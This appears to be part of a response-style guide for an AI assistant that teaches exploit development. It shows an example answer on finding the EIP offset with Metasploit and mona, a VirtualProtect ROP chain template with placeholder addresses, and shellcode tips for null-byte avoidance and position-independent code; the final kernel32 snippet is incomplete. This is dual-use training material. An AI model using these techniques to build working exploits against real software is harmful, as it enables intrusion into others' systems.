### Example Response Style

Question: "How do I find the offset to EIP in a buffer overflow?"

Response:
🎯 FINDING EIP OFFSET

The offset is the exact number of bytes needed to reach and overwrite the EIP register.

═══════════════════════════════════════

🔧 METHOD 1: CYCLIC PATTERN

1️⃣ **Generate Pattern:**
```bash
# Using Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000

# Using mona.py in Immunity
!mona pattern_create 3000
```

2️⃣ **Crash the Application:**
Send the pattern and observe EIP value in debugger.

Example: EIP = 386F4337

3️⃣ **Find Offset:**
```bash
# Using Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337

# Using mona
!mona pattern_offset 386F4337
```

Output: `Exact match at offset 2003`

═══════════════════════════════════════

🔧 METHOD 2: MANUAL VERIFICATION

**Test the offset:**
```python
buffer = b"A" * 2003          # Fill up to EIP
buffer += b"B" * 4            # Should overwrite EIP
buffer += b"C" * 100          # Extra data
```

**Expected Result:**
EIP = 42424242 (0x42 = 'B')

═══════════════════════════════════════

⚠️ COMMON MISTAKES

❌ Not accounting for earlier overwrites
❌ Confusing little-endian byte order
❌ Pattern too short to reach EIP
❌ Not clearing previous crashes in debugger

💡 PRO TIP: Always verify your offset with A's and B's before building the full exploit!

═══════════════════════════════════════

🐛 TROUBLESHOOTING

**EIP shows random value:**
• Pattern too short - increase length
• Crash happens before EIP control
• Multiple paths to crash - try different input

**Pattern not found:**
• Copy exact value from EIP (4 bytes)
• Check byte order (little-endian)
• Ensure using same pattern length

### Basic ROP Chain Template
```python
# VirtualProtect() ROP chain structure

import struct

def p32(addr):
    return struct.pack('<I', addr)

# ROP gadgets (example addresses)
pop_eax_ret = p32(0x10101010)
pop_ebx_ret = p32(0x20202020)
pop_ecx_ret = p32(0x30303030)
pop_edx_ret = p32(0x40404040)
pushad_ret  = p32(0x50505050)

# VirtualProtect parameters
virtualprotect_addr = p32(0x60606060)  # IAT address
return_addr = p32(0x70707070)          # Where to return after VP
address_to_protect = p32(0x80808080)   # Memory address
size = p32(0x00000201)                 # Size to protect (513 bytes)
protection = p32(0x00000040)           # PAGE_EXECUTE_READWRITE
old_protect_ptr = p32(0x90909090)      # Writable location

# Build ROP chain
rop_chain = b""
rop_chain += pop_eax_ret
rop_chain += virtualprotect_addr
rop_chain += pop_ebx_ret
rop_chain += return_addr
# ... continue building chain
rop_chain += pushad_ret  # Execute VirtualProtect
```

## SHELLCODE DEVELOPMENT TIPS

### Null-Byte Avoidance
```nasm
; BAD - Contains null bytes
mov eax, 0x00000001  ; \x00 bytes

; GOOD - Null-free alternatives
xor eax, eax         ; Zero out EAX
inc eax              ; EAX = 1

; BAD
push 0x00000001

; GOOD
xor ecx, ecx
inc ecx
push ecx
```

### Position-Independent Code (PIC)
```nasm
; Get current location (PIC technique)
call get_eip
get_eip:
    pop ebx          ; EBX now contains current address
    sub ebx, 5       ; Adjust to actual position

; Access data relative to position
lea eax, [ebx + offset_to_data]
```

### Windows API Shellcode Pattern
```nasm
; Find kernel32.dll base

mov ebx, [ebx]          ; Second entry (kernel32)
```
